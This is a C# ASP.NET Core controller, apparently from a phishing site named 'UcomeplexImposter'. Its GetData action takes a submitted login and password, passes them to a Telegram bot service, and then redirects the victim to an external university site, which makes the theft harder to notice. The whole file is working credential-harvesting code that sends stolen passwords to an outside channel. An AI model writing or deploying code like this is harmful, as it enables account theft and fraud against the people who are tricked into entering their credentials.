using Microsoft.AspNetCore.Mvc;
using System.Diagnostics;
using UcomeplexImposter.Models;
using UcomeplexImposter.Service;

namespace UcomeplexImposter.Controllers
{
    public class HomeController : Controller
    {
        private readonly TelegramBotService _telegramBotService;

        public HomeController(TelegramBotService telegramBotService)
        {
            _telegramBotService = telegramBotService;
        }

        public IActionResult Index()
        {
            return View();
        }

        public IActionResult Privacy()
        {
            return View();
        }

        [HttpPost]
        public async Task<IActionResult> GetData(string login, string pass)
        {
            Dictionary<string, string> data = new Dictionary<string, string>()
            {
                {nameof(login), login},
                {nameof(pass), pass},
        
            };
            
            await _telegramBotService.SendMessage(data);

            return Redirect("https://chgu.org/");
        }
    }
}
